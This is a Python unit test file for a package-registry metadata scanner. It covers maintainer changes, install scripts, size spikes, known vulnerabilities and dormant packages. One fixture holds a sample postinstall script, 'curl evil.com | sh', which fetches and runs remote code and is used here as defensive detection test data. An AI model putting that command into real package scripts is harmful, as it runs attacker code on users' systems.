"""Tests for thresher.scanners.registry_meta."""

from __future__ import annotations

from thresher.scanners.registry_meta import parse_registry_meta_output


class TestParseRegistryMetaOutput:
    def test_empty_output(self):
        raw = {"scanner": "registry-meta", "findings": [], "total": 0}
        assert parse_registry_meta_output(raw) == []

    def test_maintainer_change(self):
        raw = {
            "scanner": "registry-meta",
            "findings": [
                {
                    "type": "maintainer_change",
                    "package": "hijacked-pkg",
                    "ecosystem": "npm",
                    "severity": "high",
                    "description": "Maintainer change between 1.0.0 and 1.0.1",
                    "detail": {"removed": ["original-author"], "added": ["new-person"]},
                }
            ],
        }
        findings = parse_registry_meta_output(raw)
        assert len(findings) == 1
        assert findings[0].category == "metadata"
        assert findings[0].severity == "high"
        assert findings[0].package_name == "hijacked-pkg"

    def test_install_script_introduced(self):
        raw = {
            "scanner": "registry-meta",
            "findings": [
                {
                    "type": "install_script_introduced",
                    "package": "sneaky-pkg",
                    "ecosystem": "npm",
                    "severity": "critical",
                    "description": "Install scripts introduced in 2.0.0",
                    "detail": {"scripts": {"postinstall": "curl evil.com | sh"}},
                }
            ],
        }
        findings = parse_registry_meta_output(raw)
        assert len(findings) == 1
        assert findings[0].severity == "critical"

    def test_tarball_size_spike(self):
        raw = {
            "scanner": "registry-meta",
            "findings": [
                {
                    "type": "tarball_size_spike",
                    "package": "bloated-pkg",
                    "ecosystem": "npm",
                    "severity": "medium",
                    "description": "Package size increased 15x",
                    "detail": {"ratio": 15.0},
                }
            ],
        }
        findings = parse_registry_meta_output(raw)
        assert findings[0].severity == "medium"
        assert "tarball_size_spike" in findings[0].title

    def test_pypi_vulnerabilities(self):
        raw = {
            "scanner": "registry-meta",
            "findings": [
                {
                    "type": "pypi_known_vulnerabilities",
                    "package": "vuln-pkg",
                    "ecosystem": "pypi",
                    "severity": "high",
                    "description": "PyPI reports 3 known vulnerabilities",
                    "detail": {"count": 3, "ids": ["PYSEC-2024-1"]},
                }
            ],
        }
        findings = parse_registry_meta_output(raw)
        assert findings[0].severity == "high"

    def test_dormant_reactivation_pypi(self):
        raw = {
            "scanner": "registry-meta",
            "findings": [
                {
                    "type": "dormant_reactivation",
                    "package": "old-pypi-pkg",
                    "ecosystem": "pypi",
                    "severity": "medium",
                    "description": "Package dormant for 400 days",
                    "detail": {"gap_days": 400},
                }
            ],
        }
        findings = parse_registry_meta_output(raw)
        assert findings[0].category == "metadata"

    def test_multiple_findings_unique_ids(self):
        raw = {
            "scanner": "registry-meta",
            "findings": [
                {"type": "maintainer_change", "package": "a", "ecosystem": "npm",
                 "severity": "high", "description": "changed"},
                {"type": "tarball_size_spike", "package": "b", "ecosystem": "npm",
                 "severity": "medium", "description": "big"},
            ],
        }
        findings = parse_registry_meta_output(raw)
        assert len(findings) == 2
        assert findings[0].id != findings[1].id
